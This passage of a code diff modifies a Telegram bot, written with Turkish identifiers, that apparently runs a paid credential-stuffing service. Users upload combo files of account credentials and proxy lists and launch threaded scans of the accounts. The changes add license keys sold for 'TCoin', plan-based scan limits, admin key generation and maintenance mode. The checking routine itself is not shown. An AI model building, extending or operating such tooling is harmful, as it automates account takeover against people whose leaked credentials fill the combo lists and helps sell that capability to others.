     while True:
         try:
@@ -713,30 +989,54 @@ def telegram_bot():
                     if "callback_query" in update:
                         cb = update["callback_query"]
                         chat_id = cb["message"]["chat"]["id"]
-                        message_id = cb["message"]["message_id"]
                         data_cb = cb["data"]
                         if data_cb == "main_menu":
-                            ana_menu(chat_id, message_id)
+                            ana_menu(chat_id)
                         elif data_cb == "durum":
-                            durum_menu(chat_id, message_id)
+                            durum_menu(chat_id)
+                        elif data_cb == "fiyatlar":
+                            fiyat_menu(chat_id)
                         elif data_cb == "proxy":
-                            proxy_menu(chat_id, message_id)
+                            proxy_menu(chat_id)
                         elif data_cb == "proxy_ekle":
                             proxy_waiting[chat_id] = True
                             send_message(chat_id, "📥 Send your proxy file.\nEach line: ip:port or ip:port:user:pass")
                         elif data_cb == "proxy_sil":
-                            user_proxies.clear()
-                            proxy_menu(chat_id, message_id)
+                            user_id = str(chat_id)
+                            user_proxies.pop(user_id, None)
+                            user_proxy_index.pop(user_id, None)
+                            send_message(chat_id, "✅ Proxies removed.")
+                            proxy_menu(chat_id)
                         elif data_cb == "baslat":
                             send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                         elif data_cb == "multi_start":
                             send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
                             multi_bekleyen[chat_id] = []
+                        elif data_cb == "key_giris":
+                            send_message(chat_id, "🔑 To enter key: /key LICENSE_KEY")
+                        elif data_cb == "key_olustur":
+                            if str(chat_id) == str(ADMIN_ID):
+                                key_menu(chat_id)
+                        elif data_cb == "key_daily":
+                            if str(chat_id) == str(ADMIN_ID):
+                                key = generate_key("daily")
+                                send_message(chat_id, f"✅ DAILY KEY CREATED\n\nKey: {key}\nPrice: 750 TCoin\nSingle Scan: 3.000\nDuration: 24 hours\n\nTimer starts when used.")
+                        elif data_cb == "key_weekly":
+                            if str(chat_id) == str(ADMIN_ID):
+                                key = generate_key("weekly")
+                                send_message(chat_id, f"✅ WEEKLY KEY CREATED\n\nKey: {key}\nPrice: 3.000 TCoin\nSingle Scan: 5.000\nDuration: 7 days\n\nTimer starts when used.")
+                        elif data_cb == "key_monthly":
+                            if str(chat_id) == str(ADMIN_ID):
+                                key = generate_key("monthly")
+                                send_message(chat_id, f"✅ MONTHLY KEY CREATED\n\nKey: {key}\nPrice: 9.000 TCoin\nSingle Scan: 7.000\nDuration: 30 days\n\nTimer starts when used.")
                         elif data_cb == "thread_menu":
-                            thread_menu(chat_id, message_id)
+                            if str(chat_id) == str(ADMIN_ID):
+                                thread_menu(chat_id)
                         elif data_cb.startswith("thread_"):
-                            ADMIN_THREAD = int(data_cb.split("_")[1])
-                            thread_menu(chat_id, message_id)
+                            if str(chat_id) == str(ADMIN_ID):
+                                ADMIN_THREAD = int(data_cb.split("_")[1])
+                                send_message(chat_id, f"✅ Thread set to {ADMIN_THREAD}.")
+                                ana_menu(chat_id)
                         continue
                     if "message" not in update:
                         continue
@@ -745,17 +1045,21 @@ def telegram_bot():
                     if "document" in msg:
                         file_id = msg["document"]["file_id"]
                         file_name = msg["document"].get("file_name", "combo.txt")
-
+                        
                         if chat_id in proxy_waiting:
                             content = download_file(file_id)
                             if content:
-                                count = load_user_proxies(content)
-                                send_message(chat_id, f"✅ {count} proxies loaded!")
+                                count = load_user_proxies(chat_id, content)
+                                send_message(chat_id, f"✅ {count} proxies loaded!\nThese will be used for your scans.")
                             else:
                                 send_message(chat_id, "❌ File could not be downloaded.")
                             del proxy_waiting[chat_id]
                             continue
-
+                        
+                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
+                            send_message(chat_id, "🔧 Bot is in maintenance mode. Please try later.")
+                            continue
+                        
                         if chat_id in multi_bekleyen:
                             multi_bekleyen[chat_id].append((file_id, file_name))
                             send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])} files. Type /bitti when done.")
@@ -771,7 +1075,38 @@ def telegram_bot():
                             if not accounts:
                                 send_message(chat_id, "❌ No valid accounts found.")
                                 continue
+                            plan_name = get_user_plan(chat_id)
+                            plan_info = get_plan_info(plan_name)
+                            single_limit = plan_info["single_limit"]
+                            
+                            if single_limit > 0 and len(accounts) > single_limit:
+                                bekleyen_hesaplar[chat_id] = {
+                                    "accounts": accounts[single_limit:],
+                                    "file_name": file_name
+                                }
+                                send_message(chat_id, f"📂 File: {len(accounts)} accounts\n📂 Single Scan: {single_limit}\n\n⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(accounts) - single_limit}\nType /devam to continue.")
+                                accounts = accounts[:single_limit]
+                            
+                            if plan_name == "free":
+                                remaining = get_remaining_daily(chat_id)
+                                if remaining <= 0:
+                                    send_message(chat_id, "❌ DAILY LIMIT REACHED\n\n⏳ Reset at: 00:00")
+                                    continue
+                                if len(accounts) > remaining:
+                                    bekleyen_hesaplar[chat_id] = {
+                                        "accounts": accounts[remaining:],
+                                        "file_name": file_name
+                                    }
+                                    send_message(chat_id, f"⚠️ First {remaining} accounts will be scanned.\nRemaining: {len(accounts) - remaining}")
+                                    accounts = accounts[:remaining]
+                            
                             send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning started...")
+                            
+                            user_id = str(chat_id)
+                            if user_id in users_db:
+                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(accounts)
+                                save_db()
+                            
                             t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                             t.start()
                     elif msg.get("text") == "/start":
@@ -780,13 +1115,123 @@ def telegram_bot():
                         proxy_menu(chat_id)
                     elif msg.get("text") == "/stop":
                         tarama_durdur[chat_id] = True
-                        if chat_id in aktif_progress:
-                            unpin_message(chat_id, aktif_progress[chat_id])
-                        send_message(chat_id, "⏹️ Stopping scan...")
+                        send_message(chat_id, "⏹️ Stopping scan... Results will be sent shortly.")
+                    elif msg.get("text") == "/devam":
+                        if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
+                            kalan = bekleyen_hesaplar[chat_id]["accounts"]
+                            file_name = bekleyen_hesaplar[chat_id]["file_name"]
+                            del bekleyen_hesaplar[chat_id]
+                            
+                            plan_name = get_user_plan(chat_id)
+                            plan_info = get_plan_info(plan_name)
+                            single_limit = plan_info["single_limit"]
+                            
+                            if single_limit > 0 and len(kalan) > single_limit:
+                                bekleyen_hesaplar[chat_id] = {
+                                    "accounts": kalan[single_limit:],
+                                    "file_name": file_name
+                                }
+                                send_message(chat_id, f"⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(kalan) - single_limit}")
+                                kalan = kalan[:single_limit]
+                            
+                            if plan_name == "free":
+                                remaining = get_remaining_daily(chat_id)
+                                if remaining <= 0:
+                                    send_message(chat_id, "❌ DAILY LIMIT REACHED")
+                                    continue
+                                if len(kalan) > remaining:
+                                    bekleyen_hesaplar[chat_id] = {
+                                        "accounts": kalan[remaining:],
+                                        "file_name": file_name
+                                    }
+                                    kalan = kalan[:remaining]
+                            
+                            send_message(chat_id, f"🔱 Continuing with {len(kalan)} accounts...")
+                            
+                            user_id = str(chat_id)
+                            if user_id in users_db:
+                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(kalan)
+                                save_db()
+                            
+                            t = threading.Thread(target=tarama_yap, args=(chat_id, kalan, file_name), daemon=True)
+                            t.start()
+                        else:
+                            send_message(chat_id, "❌ No remaining accounts to scan.")
                     elif msg.get("text") == "/durum":
                         durum_menu(chat_id)
+                    elif msg.get("text") == "/rapor":
+                        rapor(chat_id)
+                    elif msg.get("text") == "/keyler":
+                        keyler_listesi(chat_id)
+                    elif msg.get("text") == "/bakim":
+                        bakim(chat_id)
                     elif msg.get("text") == "/thread":
                         thread_menu(chat_id)
+                    elif msg.get("text", "").startswith("/keyiptal "):
+                        if str(chat_id) == str(ADMIN_ID):
+                            key = msg["text"].replace("/keyiptal", "").strip()
+                            if key in keys_db:
+                                del keys_db[key]
+                                save_db()
+                                send_message(chat_id, f"✅ Key deleted: {key}")
+                            else:
+                                send_message(chat_id, "❌ Key not found.")
+                    elif msg.get("text", "").startswith("/key "):
+                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
+                            send_message(chat_id, "🔧 Bot is in maintenance mode.")
+                            continue
+                        key = msg["text"].split(" ", 1)[1].strip() if " " in msg["text"] else ""
+                        if key in keys_db:
+                            key_data = keys_db[key]
+                            
+                            if key_data.get("expires"):
+                                expiry = datetime.fromisoformat(key_data["expires"])
+                                if expiry <= datetime.now():
+                                    send_message(chat_id, "❌ This key has expired.")
+                                    continue
+                            
+                            if key_data.get("bound_to") and str(key_data["bound_to"]) != str(chat_id):
+                                send_message(chat_id, "❌ This key is already bound to another account.")
+                                continue
+                            
+                            keys_db[key]["bound_to"] = str(chat_id)
+                            
+                            if not key_data.get("expires"):
+                                duration_hours = PLANS[key_data["type"]]["duration"]
+                                if duration_hours:
+                                    expiry = datetime.now() + timedelta(hours=duration_hours)
+                                    keys_db[key]["expires"] = expiry.isoformat()
+                            
+                            user_id = str(chat_id)
+                            if user_id not in users_db:
+                                users_db[user_id] = {}
+                            
+                            users_db[user_id]["plan"] = key_data["type"]
+                            users_db[user_id]["key_expires"] = keys_db[key]["expires"]
+                            users_db[user_id]["daily_used"] = 0
+                            users_db[user_id]["last_reset"] = datetime.now().strftime('%Y-%m-%d')
+                            save_db()
+                            
+                            plan_info = get_plan_info(key_data["type"])
+                            if keys_db[key].get("expires"):
+                                expiry = datetime.fromisoformat(keys_db[key]["expires"])
+                                remaining = expiry - datetime.now()
+                                days = remaining.days
+                                hours = remaining.seconds // 3600
+                                kalan = f"{days}d {hours}h"
+                            else:
+                                kalan = "Unlimited"
+                            
+                            send_message(chat_id, f"✅ KEY ACTIVATED\n\n📋 Plan: {plan_info['name']}\n⏳ Remaining: {kalan}\n📂 Single: {plan_info['single_limit']}")
+                        else:
+                            send_message(chat_id, "❌ Invalid key.")
+                    elif msg.get("text", "").startswith("/duyuru"):
+                        if str(chat_id) == str(ADMIN_ID):
+                            mesaj = msg["text"].replace("/duyuru", "").strip()
+                            if mesaj:
+                                duyuru(chat_id, mesaj)
+                            else:
+                                send_message(chat_id, "❌ Usage: /duyuru MESSAGE")
                     elif msg.get("text") == "/bitti":
                         if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                             send_message(chat_id, "📂 Downloading and merging all files...")
@@ -799,11 +1244,37 @@ def telegram_bot():
                                     hesaplar = cokludosyayukle([f"multi_{fid}.txt"])
                                     tum_hesaplar.extend(hesaplar)
                             benzersiz = list(dict.fromkeys(tum_hesaplar))
-                            if not benzersiz:
-                                send_message(chat_id, "❌ No valid accounts found.")
-                                del multi_bekleyen[chat_id]
-                                continue
+                            plan_name = get_user_plan(chat_id)
+                            plan_info = get_plan_info(plan_name)
+                            single_limit = plan_info["single_limit"]
+                            
+                            if single_limit > 0 and len(benzersiz) > single_limit:
+                                bekleyen_hesaplar[chat_id] = {
+                                    "accounts": benzersiz[single_limit:],
+                                    "file_name": "multi_combo"
+                                }
+                                send_message(chat_id, f"⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(benzersiz) - single_limit}")
+                                benzersiz = benzersiz[:single_limit]
+                            
+                            if plan_name == "free":
+                                remaining = get_remaining_daily(chat_id)
+                                if remaining <= 0:
+                                    send_message(chat_id, "❌ Daily limit reached.")
+                                    continue
+                                if len(benzersiz) > remaining:
+                                    bekleyen_hesaplar[chat_id] = {
+                                        "accounts": benzersiz[remaining:],
+                                        "file_name": "multi_combo"
+                                    }
+                                    benzersiz = benzersiz[:remaining]
+                            
                             send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning started...")
+                            
+                            user_id = str(chat_id)
+                            if user_id in users_db:
+                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(benzersiz)
+                                save_db()
+                            
                             t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                             t.start()
                             del multi_bekleyen[chat_id]
